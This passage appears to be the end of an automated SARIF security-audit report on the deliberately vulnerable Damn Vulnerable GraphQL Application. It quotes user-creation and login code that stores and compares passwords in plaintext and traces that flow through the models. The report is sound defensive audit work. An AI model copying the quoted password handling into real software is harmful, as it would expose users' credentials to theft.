\"compliance:ISO27001:A.8.24\",\n              \"compliance:OWASP:A02:2021\",\n              \"compliance:PCI-DSS:Req-3\",\n              \"compliance:SOC2:CC6\",\n              \"security\"\n            ]\n          },\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 98,\n                  \"endLine\": 103,\n                  \"snippet\": {\n                    \"text\": \"def mutate(root, info, user_data=None):\\n    user_obj = User.create_user(\\n      username=user_data.username,\\n      email=user_data.email,\\n      password=user_data.password\\n    )\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            },\n            {\n              \"id\": 2,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 233,\n                  \"endLine\": 237,\n                  \"snippet\": {\n                    \"text\": \"def mutate(self, info , username, password) :\\n        user = User.query.filter_by(username=username, password=password).first()\\n        Audit.create_audit_entry(info)\\n        if not user:\\n            raise Exception('Authentication Failure')\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            }\n          ],\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 102\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"CreateUser mutation passes password directly to User.create_user()\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/models.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 18\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"User.create_user() stores password as-is in database\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/models.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 14\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"User.password column stores plaintext (db.String(60))\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 234\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"Login mutation uses filter_by(username=username, password=password) for plaintext comparison\"\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ]\n        }\n      ],\n      \"automationDetails\": {\n        \"id\": \"sec-af/audit/https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/2026-03-05T01:36:20.824788+00:00\"\n      }\n    }\n  ]\n}",
+  "strategies_used": [
+    "injection",
+    "auth",
+    "data_exposure",
+    "config_secrets",
+    "api_security"
+  ],
+  "timestamp": "2026-03-05T01:36:20.824788+00:00",
+  "total_raw_findings": 50
+}
